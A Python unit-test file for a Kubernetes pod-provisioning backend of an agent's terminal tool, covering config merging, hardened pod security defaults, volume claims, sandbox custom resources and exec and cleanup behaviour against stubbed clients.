"""Unit tests for the Kubernetes session-pod execution backend.

Ported from upstream PR #37591 and re-specified for this fork's config surface:
every setting is a ``terminal.kubernetes.*`` config.yaml key bridged as ONE
internal JSON env var, and the pod shape is ONE ``pod_template``
PodTemplateSpec merged over a hardened base — one artifact rendered, submitted
and security-checked.

No cluster required: the kubernetes client is stubbed into ``sys.modules`` and
manifest builders run with ``api=None``.
"""

import base64
import io
import json
import time
import sys
import tarfile
import threading
import types as _types
from types import SimpleNamespace
from unittest.mock import MagicMock

import pytest

from tools.environments.kubernetes import (
    DEFAULT_KUBERNETES_CONFIG,
    KubernetesEnvironment,
    PodProvisioner,
    PodRef,
    Resources,
    WorkspaceProvisioner,
    merge_kubernetes_config,
    render_pod_template,
    sanitize_name,
    validate_kubernetes_config,
)

# merge_pod_template / reserved_violations / unhardened_reasons and the sandbox
# provisioner are imported inside the tests that use them, so this module still
# imports against a build that lacks them.


@pytest.fixture(autouse=True)
def _stub_kubernetes(monkeypatch):
    """Stub the kubernetes client so the backend imports without a cluster."""
    if "kubernetes" in sys.modules:
        return
    k = _types.ModuleType("kubernetes")
    k.client = _types.ModuleType("kubernetes.client")
    k.config = _types.ModuleType("kubernetes.config")
    k.stream = _types.ModuleType("kubernetes.stream")
    ws_mod = _types.ModuleType("kubernetes.stream.ws_client")
    exc_mod = _types.ModuleType("kubernetes.client.exceptions")

    class ApiException(Exception):
        def __init__(self, status=0, reason=""):
            self.status = status
            self.reason = reason
            super().__init__(f"{status}: {reason}")

    exc_mod.ApiException = ApiException
    k.client.exceptions = exc_mod

    # Every exec builds its OWN ApiClient: kubernetes.stream.stream()
    # monkeypatches api_client.request, so sharing one corrupts it under
    # concurrency.  These are real (tiny) classes rather than MagicMock so
    # CoreV1Api(api_client) does not read as MagicMock(spec=...).
    class _StubApiClient:
        def __init__(self, configuration=None):
            self.configuration = configuration
            self.closed = False

        def close(self):
            self.closed = True

    def _stub_core_v1_api(api_client=None, **kwargs):
        api = MagicMock()
        api.api_client = api_client if api_client is not None else _StubApiClient()
        return api

    k.client.ApiClient = _StubApiClient
    k.client.CoreV1Api = _stub_core_v1_api
    k.client.CustomObjectsApi = MagicMock
    k.config.load_incluster_config = lambda: None
    k.config.load_kube_config = lambda **kw: None
    k.stream.stream = MagicMock()
    ws_mod.STDIN_CHANNEL = 0
    ws_mod.V5_CHANNEL_PROTOCOL = "v5.channel.k8s.io"
    k.stream.ws_client = ws_mod
    monkeypatch.setitem(sys.modules, "kubernetes", k)
    monkeypatch.setitem(sys.modules, "kubernetes.client", k.client)
    monkeypatch.setitem(sys.modules, "kubernetes.client.exceptions", exc_mod)
    monkeypatch.setitem(sys.modules, "kubernetes.config", k.config)
    monkeypatch.setitem(sys.modules, "kubernetes.stream", k.stream)
    monkeypatch.setitem(sys.modules, "kubernetes.stream.ws_client", ws_mod)


def _kcfg(**overrides):
    return merge_kubernetes_config(overrides)


def _sandbox_cls():
    from tools.environments.kubernetes_sandbox import SandboxProvisioner

    return SandboxProvisioner


OWNER_REF = {
    "apiVersion": "v1",
    "kind": "Pod",
    "name": "hermes-agent-0",
    "uid": "11111111-1111-1111-1111-111111111111",
    "controller": False,
    "blockOwnerDeletion": False,
}


# ---------------------------------------------------------------------------
# Value types / helpers
# ---------------------------------------------------------------------------


def test_podref_holds_coordinates():
    ref = PodRef(namespace="hermes", pod_name="hermes-ws-abc", container="workspace")
    assert ref.namespace == "hermes"
    assert ref.pod_name == "hermes-ws-abc"
    assert ref.container == "workspace"


def test_provisioner_is_abstract():
    with pytest.raises(TypeError):
        WorkspaceProvisioner()  # ABC — cannot instantiate


def test_sanitize_name_makes_rfc1123_safe_names():
    """RL/benchmark task ids carry uppercase, ``_`` and ``:``; the API server
    rejects those in a pod name with a confusing 422."""
    assert sanitize_name("default") == "default"
    slug = sanitize_name("Task_ID:With/Junk")
    assert slug.replace("-", "").isalnum()
    assert slug.islower()
    # Distinct inputs that share a prefix must not collide after truncation.
    a = sanitize_name("x" * 200 + "aaa")
    b = sanitize_name("x" * 200 + "bbb")
    assert a != b
    assert len(a) <= 40


# ---------------------------------------------------------------------------
# Config schema
# ---------------------------------------------------------------------------


def test_partial_config_still_yields_every_default():
    """cli.py and gateway/run.py bridge the RAW config without deep-merging
    DEFAULT_CONFIG, so a user who sets one key produces a partial payload."""
    merged = merge_kubernetes_config({"namespace": "hermes-agents"})
    assert merged["namespace"] == "hermes-agents"
    assert merged["provisioner"] == "pod"
    assert merged["container_name"] == "workspace"
    assert merged["volume"]["access_modes"] == ["ReadWriteOnce"]
    assert merged["sandbox"]["api_group"] == "agents.x-k8s.io"


def test_partial_nested_config_merges_rather_than_replaces():
    merged = merge_kubernetes_config(
        {"volume": {"size": "20Gi"}, "sandbox": {"api_version": "v1"}}
    )
    assert merged["volume"]["size"] == "20Gi"
    assert merged["volume"]["access_modes"] == ["ReadWriteOnce"]
    assert merged["sandbox"]["api_version"] == "v1"
    assert merged["sandbox"]["api_group"] == "agents.x-k8s.io"


def test_merge_does_not_mutate_defaults():
    merged = merge_kubernetes_config({"pod_template": {"spec": {}}})
    merged["pod_template"]["spec"]["hostPID"] = True
    merged["sandbox"]["spec"]["ttlSeconds"] = 5
    assert DEFAULT_KUBERNETES_CONFIG["pod_template"] == {}
    assert DEFAULT_KUBERNETES_CONFIG["sandbox"]["spec"] == {}


def test_validation_rejects_bad_provisioner_and_quantities():
    problems = validate_kubernetes_config(_kcfg(provisioner="operator"))
    assert any("provisioner" in p for p in problems)

    problems = validate_kubernetes_config(_kcfg(volume={"size": "2 gigabytes"}))
    assert any("quantity" in p for p in problems)


def test_the_old_provisioner_name_is_gone():
    """`direct` was renamed `pod` — a hard cut, so the old value must FAIL
    rather than quietly keep working through an alias."""
    from tools.environments.kubernetes import VALID_PROVISIONERS

    assert VALID_PROVISIONERS == ("pod", "sandbox")
    assert any(
        "provisioner" in p
        for p in validate_kubernetes_config(_kcfg(provisioner="direct"))
    )


def test_default_config_is_valid():
    assert validate_kubernetes_config(merge_kubernetes_config({})) == []


def test_hard_cut_keys_are_not_in_the_schema():
    """The ~30 PodSpec-shaped keys collapsed into pod_template. No aliases, no
    shim: the schema is the 14 top-level keys the backend reasons about
    (19 leaves counting volume.* and sandbox.*)."""
    # Named, not counted: a bare `== 14` fails for any legitimate new key and
    # names no offender. This fails for the same input and says which key.
    assert set(DEFAULT_KUBERNETES_CONFIG) == {
        "provisioner", "namespace", "kubeconfig", "context", "image",
        "container_name", "mount_path", "pod_template", "persistent", "volume",
        "active_deadline_seconds", "ready_timeout_seconds", "owner_reference",
        "sandbox",
    }, sorted(DEFAULT_KUBERNETES_CONFIG)
    gone = {
        "image_pull_policy", "image_pull_secrets", "service_account",
        "automount_service_account_token", "runtime_class_name",
        "node_selector", "tolerations", "labels", "annotations", "env",
        "security_context", "resources", "pod_template_overrides",
    }
    assert not (gone & set(DEFAULT_KUBERNETES_CONFIG))
    assert set(DEFAULT_KUBERNETES_CONFIG["sandbox"]) == {
        "api_group", "api_version", "spec",
    }
    assert "pod_template" in DEFAULT_KUBERNETES_CONFIG


# ---------------------------------------------------------------------------
# Pod template
# ---------------------------------------------------------------------------


def _provisioner(**overrides):
    return PodProvisioner(
        _kcfg(**overrides), "hermes", api=None, owner_reference=OWNER_REF
    )


def test_ephemeral_pod_uses_emptydir_and_carries_ownerref():
    pod = _provisioner().pod_manifest(
        "abc", persistent=False, image="img:1", resources=Resources()
    )
    vols = {v["name"]: v for v in pod["spec"]["volumes"]}
    assert vols["workspace"]["emptyDir"] == {}
    mount = pod["spec"]["containers"][0]["volumeMounts"][0]
    assert mount["mountPath"] == "/workspace"
    assert pod["metadata"]["ownerReferences"][0]["uid"] == OWNER_REF["uid"]


def test_persistent_pod_references_pvc_by_task_id():
    p = _provisioner()
    pod = p.pod_manifest("mytask", persistent=True, image="img:1", resources=Resources())
    vol = pod["spec"]["volumes"][0]
    assert vol["persistentVolumeClaim"]["claimName"] == "hermes-ws-mytask"


def test_pvc_manifest_has_no_ownerref():
    """A persistent PVC must outlive the agent pod, so it gets no ownerRef."""
    pvc = _provisioner().pvc_manifest("mytask", resources=Resources(disk_mib=10240))
    assert pvc["metadata"]["name"] == "hermes-ws-mytask"
    assert "ownerReferences" not in pvc["metadata"]
    # Conservative explicit default rather than 50Gi derived from container_disk.
    assert pvc["spec"]["resources"]["requests"]["storage"] == "10Gi"
    assert "storageClassName" not in pvc["spec"]
    # Nothing else reaps these claims, so a reaper needs a selector.
    assert pvc["metadata"]["labels"]["hermes.nousresearch.com/task"] == "mytask"


def test_pvc_size_still_falls_back_to_container_disk_when_cleared():
    pvc = _provisioner(volume={"size": ""}).pvc_manifest(
        "mytask", resources=Resources(disk_mib=10240)
    )
    assert pvc["spec"]["resources"]["requests"]["storage"] == "10240Mi"


def test_pvc_name_can_be_pinned_so_instances_do_not_share_a_workspace():
    """pvc_name() is task-scoped but not instance-scoped, so two agents in one
    namespace collide on hermes-ws-default (RWO: the second pod stays
    Pending). volume.claim_name is the escape hatch."""
    default = _provisioner().pvc_name("default")
    pinned = _provisioner(volume={"claim_name": "hermes-ws-agent-a"}).pvc_name(
        "default"
    )
    assert default == "hermes-ws-default"
    assert pinned == "hermes-ws-agent-a"


def test_pvc_honours_configured_storage_class_and_size():
    p = PodProvisioner(
        _kcfg(volume={"size": "20Gi", "storage_class_name": "truenas-nvme",
                      "access_modes": ["ReadWriteMany"]}),
        "hermes", api=None, owner_reference=OWNER_REF,
    )
    pvc = p.pvc_manifest("mytask", resources=Resources())
    assert pvc["spec"]["resources"]["requests"]["storage"] == "20Gi"
    assert pvc["spec"]["storageClassName"] == "truenas-nvme"
    assert pvc["spec"]["accessModes"] == ["ReadWriteMany"]


def test_pod_manifest_omits_ownerref_when_owner_unknown():
    """K8s rejects an ownerReference with an empty name/uid with a 422."""
    p = PodProvisioner(_kcfg(), "hermes", api=None, owner_reference=None)
    pod = p.pod_manifest("abc", persistent=False, image="img:1", resources=Resources())
    assert "ownerReferences" not in pod["metadata"]


def test_ephemeral_pod_has_active_deadline_persistent_does_not():
    p = PodProvisioner(
        _kcfg(active_deadline_seconds=999), "hermes", api=None, owner_reference=OWNER_REF
    )
    ephemeral = p.pod_manifest("abc", persistent=False, image="i:1", resources=Resources())
    persistent = p.pod_manifest("abc", persistent=True, image="i:1", resources=Resources())
    assert ephemeral["spec"]["activeDeadlineSeconds"] == 999
    assert "activeDeadlineSeconds" not in persistent["spec"]


def test_the_hardened_base_is_hardened():
    """What pod_template merges OVER. Every property here is one the hardening
    judge checks for, so the shipped default earns the approval skip."""
    pod = _provisioner().pod_manifest(
        "abc", persistent=False, image="img:1", resources=Resources()
    )
    spec = pod["spec"]
    assert spec["restartPolicy"] == "Never"
    assert spec["automountServiceAccountToken"] is False
    assert spec["serviceAccountName"] == "hermes-session-noperms"
    assert spec["hostNetwork"] is False
    assert spec["hostPID"] is False
    assert spec["hostIPC"] is False
    assert spec["enableServiceLinks"] is False
    assert spec["securityContext"]["runAsNonRoot"] is True
    assert spec["securityContext"]["seccompProfile"] == {"type": "RuntimeDefault"}
    sc = spec["containers"][0]["securityContext"]
    assert sc["runAsNonRoot"] is True
    assert sc["allowPrivilegeEscalation"] is False
    assert sc["capabilities"]["drop"] == ["ALL"]
    # restricted-v2 assigns runAsUser/fsGroup from the namespace range; a
    # hardcoded value outside it is rejected at admission.
    assert "runAsUser" not in spec["securityContext"]
    assert "fsGroup" not in spec["securityContext"]
    assert "runAsUser" not in sc


def test_pod_template_reaches_the_manifest():
    """The escape hatch: anything that is merely PodSpec goes here, and it is
    the ONLY user layer."""
    tolerations = [{"key": "kata", "operator": "Exists", "effect": "NoSchedule"}]
    p = _provisioner(pod_template={
        "metadata": {"labels": {"team": "hermes"},
                     "annotations": {"io.katacontainers.x": "4096"}},
        "spec": {
            "runtimeClassName": "kata",
            "nodeSelector": {"node-role.kubernetes.io/worker": ""},
            "tolerations": tolerations,
            "imagePullSecrets": [{"name": "regcred"}],
            "priorityClassName": "high",
            "containers": [{"name": "workspace",
                            "imagePullPolicy": "Always",
                            "env": [{"name": "HTTPS_PROXY", "value": "http://p:3128"}]}],
        },
    })
    pod = p.pod_manifest("abc", persistent=False, image="i:1", resources=Resources())
    spec = pod["spec"]
    assert spec["runtimeClassName"] == "kata"
    assert spec["nodeSelector"] == {"node-role.kubernetes.io/worker": ""}
    assert spec["tolerations"] == tolerations
    assert spec["imagePullSecrets"] == [{"name": "regcred"}]
    assert spec["priorityClassName"] == "high"
    assert pod["metadata"]["labels"]["team"] == "hermes"
    assert pod["metadata"]["labels"]["app.kubernetes.io/managed-by"] == "hermes-agent"
    assert pod["metadata"]["annotations"]
    container = spec["containers"][0]
    assert container["imagePullPolicy"] == "Always"
    assert {"name": "HTTPS_PROXY", "value": "http://p:3128"} in container["env"]
    # ...and the merge kept the base container intact.
    assert container["image"] == "i:1"
    assert container["command"] == ["sleep", "infinity"]
    # Merge, not replace, at the spec level too.
    assert spec["restartPolicy"] == "Never"


def test_resources_come_from_the_shared_container_keys():
    """terminal.container_cpu / container_memory feed the BASE; a pod_template
    container merges over it by name."""
    default_pod = _provisioner().pod_manifest(
        "abc", persistent=False, image="i:1",
        resources=Resources(cpu=0.5, memory_mib=2048),
    )
    requests = default_pod["spec"]["containers"][0]["resources"]["requests"]
    assert requests == {"cpu": "500m", "memory": "2048Mi"}
    assert "limits" not in default_pod["spec"]["containers"][0]["resources"]

    explicit = _provisioner(pod_template={"spec": {"containers": [
        {"name": "workspace", "resources": {
            "requests": {"cpu": "250m", "memory": "1Gi"},
            "limits": {"cpu": "2", "memory": "4Gi", "ephemeral-storage": "8Gi"}}},
    ]}}).pod_manifest("abc", persistent=False, image="i:1", resources=Resources())
    res = explicit["spec"]["containers"][0]["resources"]
    assert res["requests"] == {"cpu": "250m", "memory": "1Gi"}
    assert res["limits"] == {"cpu": "2", "memory": "4Gi", "ephemeral-storage": "8Gi"}


def test_tmp_emptydir_is_unconditional():
    """init_session() writes its env snapshot under /tmp. The old `/tmp` mount
    was conditional on a read_only_root_filesystem config key that no longer
    exists, so a pod_template setting readOnlyRootFilesystem: true would have
    silently broken cwd/env tracking."""
    pod = _provisioner().pod_manifest(
        "abc", persistent=False, image="i:1", resources=Resources()
    )
    mounts = {m["mountPath"] for m in pod["spec"]["containers"][0]["volumeMounts"]}
    assert "/tmp" in mounts
    assert any(v["name"] == "tmp" for v in pod["spec"]["volumes"])


def test_mount_path_is_configurable():
    p = _provisioner(mount_path="/home/agent")
    pod = p.pod_manifest("abc", persistent=False, image="i:1", resources=Resources())
    container = pod["spec"]["containers"][0]
    assert container["workingDir"] == "/home/agent"
    assert container["volumeMounts"][0]["mountPath"] == "/home/agent"


def test_pod_name_is_instance_scoped():
    """_resolve_container_task_id collapses nearly everything to "default", so
    without a discriminator two agents in one namespace fight over the same pod
    name — the second 409s, "reuses" the first's workspace, and later deletes it."""
    a = PodProvisioner(_kcfg(), "hermes", api=None, owner_reference=OWNER_REF)
    b = PodProvisioner(
        _kcfg(), "hermes", api=None,
        owner_reference={**OWNER_REF, "uid": "22222222-2222-2222-2222-222222222222"},
    )
    assert a.workspace_name("default") != b.workspace_name("default")
    # The PVC is NOT instance-scoped — a persistent workspace must resume for
    # the same task after an agent restart.
    assert a.pvc_name("default") == b.pvc_name("default")


# ---------------------------------------------------------------------------
# PodProvisioner against a mocked API
# ---------------------------------------------------------------------------


def _running_pod(labels=None, owners=None, containers=("workspace",)):
    cond = SimpleNamespace(type="Ready", status="True")
    return SimpleNamespace(
        metadata=SimpleNamespace(
            name="hermes-ws", labels=labels or {}, owner_references=owners or []
        ),
        spec=SimpleNamespace(
            containers=[SimpleNamespace(name=n) for n in containers]
        ),
        status=SimpleNamespace(
            phase="Running", conditions=[cond], container_statuses=[]
        ),
    )


def _provisioner_with_api(api, **overrides):
    return PodProvisioner(
        _kcfg(**overrides), "hermes", api=api, owner_reference=OWNER_REF
    )


def test_ensure_ephemeral_creates_pod_only():
    api = MagicMock()
    api.read_namespaced_pod.return_value = _running_pod()
    p = _provisioner_with_api(api)

    ref = p.ensure("abc", persistent=False, image="img:1", resources=Resources())

    api.create_namespaced_pod.assert_called_once()
    api.create_namespaced_persistent_volume_claim.assert_not_called()
    assert api.create_namespaced_pod.call_args.kwargs["field_validation"] == "Strict"
    assert ref.pod_name == p.workspace_name("abc")
    assert ref.container == "workspace"


def test_ensure_persistent_creates_pvc_then_pod():
    from kubernetes.client.exceptions import ApiException

    api = MagicMock()
    api.read_namespaced_pod.return_value = _running_pod()
    api.read_namespaced_persistent_volume_claim.side_effect = ApiException(status=404)
    p = _provisioner_with_api(api)

    p.ensure("mytask", persistent=True, image="img:1", resources=Resources())

    api.create_namespaced_persistent_volume_claim.assert_called_once()
    api.create_namespaced_pod.assert_called_once()
    # Without fieldValidation=Strict an unknown field is accepted with 201 and
    # silently dropped, and the python client discards the API server's
    # "Warning: 299 - unknown field" header, so nothing is logged.
    for call in (api.create_namespaced_persistent_volume_claim,
                 api.create_namespaced_pod):
        assert call.call_args.kwargs["field_validation"] == "Strict"


def _hermes_pvc(labels=None, annotations=None, task="mytask", instance=None):
    """A PVC as the API returns it, carrying the stamp pvc_manifest writes."""
    from tools.environments.kubernetes import PVC_INSTANCE_ANNOTATION

    default_labels = {
        "app.kubernetes.io/managed-by": "hermes-agent",
        "app.kubernetes.io/component": "hermes-workspace",
        "hermes.nousresearch.com/task": task,
    }
    if instance is None:
        instance = PodProvisioner(
            _kcfg(), "hermes", api=None, owner_reference=OWNER_REF
        )._instance
    return SimpleNamespace(
        metadata=SimpleNamespace(
            name="hermes-ws-mytask",
            labels=default_labels if labels is None else labels,
            annotations={PVC_INSTANCE_ANNOTATION: instance}
            if annotations is None else annotations,
        )
    )


def test_ensure_persistent_skips_existing_pvc():
    api = MagicMock()
    api.read_namespaced_pod.return_value = _running_pod()
    api.read_namespaced_persistent_volume_claim.return_value = _hermes_pvc()
    p = _provisioner_with_api(api)

    p.ensure("mytask", persistent=True, image="img:1", resources=Resources())

    api.create_namespaced_persistent_volume_claim.assert_not_called()


def test_ensure_reuses_our_own_pod_on_conflict():
    from kubernetes.client.exceptions import ApiException

    api = MagicMock()
    api.create_namespaced_pod.side_effect = ApiException(status=409)
    api.read_namespaced_pod.return_value = _running_pod(
        labels={"app.kubernetes.io/managed-by": "hermes-agent"},
        owners=[SimpleNamespace(uid=OWNER_REF["uid"])],
    )
    p = _provisioner_with_api(api)

    ref = p.ensure("abc", persistent=False, image="img:1", resources=Resources())
    assert ref.pod_name == p.workspace_name("abc")


def test_ensure_refuses_to_hijack_another_agents_pod():
    """A blanket 409-as-reuse leaks another agent's workspace (and later
    deletes it) on a shared cluster."""
    from kubernetes.client.exceptions import ApiException

    api = MagicMock()
    api.create_namespaced_pod.side_effect = ApiException(status=409)
    api.read_namespaced_pod.return_value = _running_pod(
        labels={"app.kubernetes.io/managed-by": "someone-else"},
    )
    p = _provisioner_with_api(api)

    with pytest.raises(RuntimeError, match="not created by this Hermes instance"):
        p.ensure("abc", persistent=False, image="img:1", resources=Resources())


def test_wait_ready_surfaces_image_pull_failures_immediately():
    api = MagicMock()
    api.read_namespaced_pod.return_value = SimpleNamespace(
        metadata=SimpleNamespace(name="p", labels={}, owner_references=[]),
        status=SimpleNamespace(
            phase="Pending",
            conditions=[],
            container_statuses=[
                SimpleNamespace(
                    name="workspace",
                    state=SimpleNamespace(
                        waiting=SimpleNamespace(
                            reason="ImagePullBackOff", message="pull access denied"
                        ),
                        terminated=None,
                    ),
                )
            ],
        ),
    )
    p = _provisioner_with_api(api, ready_timeout_seconds=30)
    with pytest.raises(RuntimeError) as excinfo:
        p.ensure("abc", persistent=False, image="nope:1", resources=Resources())
    assert "ImagePullBackOff" in str(excinfo.value)
    assert "pull access denied" in str(excinfo.value)


def test_destroy_deletes_pod_and_keeps_pvc():
    api = MagicMock()
    p = _provisioner_with_api(api)
    p.destroy(PodRef("hermes", "hermes-ws-abc", "workspace"), persistent=True)
    api.delete_namespaced_pod.assert_called_once()
    kwargs = api.delete_namespaced_pod.call_args.kwargs
    assert kwargs["name"] == "hermes-ws-abc"
    assert kwargs["namespace"] == "hermes"
    # `sleep infinity` as PID 1 ignores SIGTERM; without grace 0 every teardown
    # waits the full 30s default, on the interrupt path.
    assert kwargs["grace_period_seconds"] == 0
    api.delete_namespaced_persistent_volume_claim.assert_not_called()


# ---------------------------------------------------------------------------
# SandboxProvisioner
# ---------------------------------------------------------------------------


def _sandbox_provisioner(api=None, custom=None, **sandbox_overrides):
    return _sandbox_cls()(
        _kcfg(provisioner="sandbox", sandbox=sandbox_overrides),
        "hermes", api=api, owner_reference=OWNER_REF, custom_api=custom,
    )


def test_sandbox_manifest_shape():
    manifest = _sandbox_provisioner().sandbox_manifest(
        "abc", persistent=False, image="img:1", resources=Resources()
    )
    assert manifest["apiVersion"] == "agents.x-k8s.io/v1beta1"
    assert manifest["kind"] == "Sandbox"
    assert manifest["metadata"]["namespace"] == "hermes"
    assert manifest["metadata"]["ownerReferences"][0]["uid"] == OWNER_REF["uid"]
    spec = manifest["spec"]["podTemplate"]["spec"]
    assert spec["containers"][0]["name"] == "workspace"
    assert spec["containers"][0]["image"] == "img:1"


def test_sandbox_pod_template_matches_the_pod_provisioners_pod_spec():
    """The same dict feeds both provisioners — the Sandbox CRD is itself
    spec.podTemplate.spec — so flipping provisioner cannot change the workload
    shape."""
    kcfg = _kcfg(pod_template={"spec": {"runtimeClassName": "kata"}})
    pod_p = PodProvisioner(kcfg, "hermes", api=None, owner_reference=OWNER_REF)
    sandbox = _sandbox_cls()(
        kcfg, "hermes", api=None, owner_reference=OWNER_REF, custom_api=None
    )
    pod_spec = pod_p.pod_manifest(
        "abc", persistent=False, image="i:1", resources=Resources()
    )["spec"]
    sandbox_spec = sandbox.sandbox_manifest(
        "abc", persistent=False, image="i:1", resources=Resources()
    )["spec"]["podTemplate"]["spec"]
    assert pod_spec == sandbox_spec
    assert sandbox_spec["runtimeClassName"] == "kata"


def test_sandbox_spec_carries_cr_fields_and_the_injected_pod_template():
    """sandbox.spec is the Sandbox CR spec (ttlSeconds, networkPolicy, ...);
    podTemplate is ASSIGNED from the one rendered template, never merged."""
    manifest = _sandbox_provisioner(
        spec={"ttlSeconds": 900, "networkPolicy": {"egress": "deny"}}
    ).sandbox_manifest("abc", persistent=False, image="i:1", resources=Resources())
    assert manifest["spec"]["ttlSeconds"] == 900
    assert manifest["spec"]["networkPolicy"] == {"egress": "deny"}
    assert manifest["spec"]["podTemplate"]["spec"]["restartPolicy"] == "Never"


def test_sandbox_ensure_creates_cr_and_waits_for_pod():
    custom = MagicMock()
    name_holder = {}

    def _get(**kwargs):
        name_holder["name"] = kwargs["name"]
        return {
            "status": {
                "conditions": [{"type": "Ready", "status": "True"}],
                "podRef": {"name": "sandbox-pod-1"},
            }
        }

    custom.get_namespaced_custom_object.side_effect = _get
    api = MagicMock()
    api.read_namespaced_pod.return_value = _running_pod()

    p = _sandbox_provisioner(api=api, custom=custom)
    ref = p.ensure("abc", persistent=False, image="img:1", resources=Resources())

    custom.create_namespaced_custom_object.assert_called_once()
    call = custom.create_namespaced_custom_object.call_args.kwargs
    assert call["group"] == "agents.x-k8s.io"
    assert call["plural"] == "sandboxes"
    assert call["field_validation"] == "Strict"
    assert ref.pod_name == "sandbox-pod-1"
    # Exec targets the reconciled pod, not the CR.
    api.read_namespaced_pod.assert_called()


def test_sandbox_ensure_falls_back_to_label_lookup_for_pod_name():
    custom = MagicMock()
    custom.get_namespaced_custom_object.return_value = {
        "status": {"conditions": [{"type": "Ready", "status": "True"}]}
    }
    api = MagicMock()
    api.list_namespaced_pod.return_value = SimpleNamespace(
        items=[SimpleNamespace(metadata=SimpleNamespace(name="labelled-pod"))]
    )
    api.read_namespaced_pod.return_value = _running_pod()

    p = _sandbox_provisioner(api=api, custom=custom)
    ref = p.ensure("abc", persistent=False, image="img:1", resources=Resources())
    assert ref.pod_name == "labelled-pod"


def test_sandbox_ensure_reports_missing_crd_actionably():
    from kubernetes.client.exceptions import ApiException

    custom = MagicMock()
    custom.create_namespaced_custom_object.side_effect = ApiException(status=404)
    p = _sandbox_provisioner(api=MagicMock(), custom=custom)
    with pytest.raises(RuntimeError, match="agent-sandbox-operator"):
        p.ensure("abc", persistent=False, image="i:1", resources=Resources())


def test_sandbox_destroy_deletes_the_custom_resource():
    custom = MagicMock()
    api = MagicMock()
    api.read_namespaced_pod.return_value = _running_pod()
    custom.get_namespaced_custom_object.return_value = {
        "status": {"conditions": [{"type": "Ready", "status": "True"}],
                   "podRef": {"name": "sandbox-pod-1"}}
    }
    p = _sandbox_provisioner(api=api, custom=custom)
    ref = p.ensure("abc", persistent=False, image="i:1", resources=Resources())

    p.destroy(ref, persistent=False)
    kwargs = custom.delete_namespaced_custom_object.call_args.kwargs
    assert kwargs["plural"] == "sandboxes"
    # Deleting the CR is what tears the pod down; the pod name differs from it.
    assert kwargs["name"] == p.workspace_name("abc")
    api.delete_namespaced_pod.assert_not_called()


def test_sandbox_provisioner_lives_in_its_own_module():
    """Requirement 7: the sandbox provisioner is cleanly separable — this file
    plus the factory branch plus the three sandbox.* keys. The shared module
    must not import it."""
    import tools.environments.kubernetes as k8s_mod

    assert not hasattr(k8s_mod, "SandboxProvisioner")
    from tools.environments.kubernetes import WorkspaceProvisioner

    assert issubclass(_sandbox_cls(), WorkspaceProvisioner)


# ---------------------------------------------------------------------------
# KubernetesEnvironment
# ---------------------------------------------------------------------------


class _FakeWSClient:
    """Mimics kubernetes.stream WSClient for one exec call."""

    def __init__(self, stdout="", returncode=0, open_cycles=1, raise_on_update=None,
                 subprotocol="v4.channel.k8s.io", update_sleep=0.0):
        self._update_sleep = update_sleep
        self._stdout = stdout
        self._returncode = returncode
        self._cycles = open_cycles
        self._raise_on_update = raise_on_update
        self.closed = False
        self.subprotocol = subprotocol
        self.stdin_writes: list[str] = []
        self.channels_closed: list[int] = []

    def write_stdin(self, data):
        self.stdin_writes.append(data)

    def close_channel(self, channel):
        self.channels_closed.append(channel)

    def is_open(self):
        if self.closed or self._cycles <= 0:
            return False
        self._cycles -= 1
        return True

    def update(self, timeout=None):
        if self._raise_on_update:
            raise self._raise_on_update
        if self._update_sleep:
            time.sleep(self._update_sleep)

    def peek_stdout(self):
        return bool(self._stdout)

    def read_stdout(self):
        s, self._stdout = self._stdout, ""
        return s

    def peek_stderr(self):
        return False

    def read_stderr(self):
        return ""

    def close(self):
        self.closed = True

    @property
    def returncode(self):
        if isinstance(self._returncode, Exception):
            raise self._returncode
        return self._returncode


def _make_k8s_env(monkeypatch, exec_results, persistent=False, api=None):
    """exec_results: list of _FakeWSClient factories / tuples per exec call."""
    monkeypatch.setattr("tools.environments.base.is_interrupted", lambda: False)

    provisioner = MagicMock()
    provisioner.workspace_name.return_value = "hermes-ws-abc"
    provisioner.namespace = "hermes"
    provisioner.ensure.return_value = PodRef("hermes", "hermes-ws-abc", "workspace")

    calls = {"i": 0}

    def fake_stream(*args, **kwargs):
        idx = min(calls["i"], len(exec_results) - 1)
        calls["i"] += 1
        spec = exec_results[idx]
        if isinstance(spec, _FakeWSClient):
            return spec
        out, rc = spec
        return _FakeWSClient(stdout=out, returncode=rc)

    monkeypatch.setattr("kubernetes.stream.stream", fake_stream)

    env = KubernetesEnvironment(
        provisioner=provisioner,
        task_id="abc",
        persistent=persistent,
        image="img:1",
        cwd="/workspace",
        timeout=30,
        api=api,
        sync_files=False,  # exercised directly below (see the file-sync tests)
    )
    env._exec_calls = calls
    return env


def test_basic_command(monkeypatch):
    # exec calls: (1) init_session bootstrap, (2) the actual command
    env = _make_k8s_env(monkeypatch, [("", 0), ("hello\n", 0)])
    result = env.execute("echo hello")
    assert "hello" in result["output"]
    assert result["returncode"] == 0


def test_nonzero_exit_code(monkeypatch):
    env = _make_k8s_env(monkeypatch, [("", 0), ("nope\n", 127)])
    result = env.execute("bad_cmd")
    assert result["returncode"] == 127


def test_exec_keeps_partial_output_when_returncode_raises(monkeypatch):
    """WSClient.returncode does yaml.safe_load(err)['status'] on the error
    channel; an abnormal disconnect leaves it empty and the property raises
    TypeError. Unguarded, _ThreadedProcessHandle discards every byte."""
    client = _FakeWSClient(stdout="partial output\n",
                           returncode=TypeError("NoneType not subscriptable"))
    env = _make_k8s_env(monkeypatch, [("", 0), client])
    result = env.execute("something")
    assert "partial output" in result["output"]


def test_exec_stream_error_returns_message_not_silence(monkeypatch):
    client = _FakeWSClient(raise_on_update=RuntimeError("connection reset"))
    env = _make_k8s_env(monkeypatch, [("", 0), client])
    result = env.execute("something")
    assert "connection reset" in result["output"]
    assert result["returncode"] != 0


def test_cleanup_calls_provisioner_destroy(monkeypatch):
    env = _make_k8s_env(monkeypatch, [("", 0)])
    env.cleanup()
    env._provisioner.destroy.assert_called_once()
    args, _kwargs = env._provisioner.destroy.call_args
    assert args[1] is False  # persistent flag


def test_cleanup_is_idempotent(monkeypatch):
    env = _make_k8s_env(monkeypatch, [("", 0)])
    env.cleanup()
    env.cleanup()
    assert env._provisioner.destroy.call_count == 1


def test_cancel_does_not_destroy_the_ephemeral_pod(monkeypatch):
    """_wait_for_process calls _kill_process() on an ORDINARY TIMEOUT as well
    as on a user interrupt (base.py:1127). Destroying the pod there deleted
    /workspace — every file the agent had just written — on any command that
    ran past its timeout, with no notice to the agent. Closing the websocket
    is enough: the kubelet reaps the exec'd process."""
    client = _FakeWSClient(open_cycles=10_000)
    env = _make_k8s_env(monkeypatch, [("", 0), client])
    handle = env._run_bash("sleep 1")
    handle.kill()
    assert client.closed is True
    env._provisioner.destroy.assert_not_called()
    assert env._pod_ref is not None


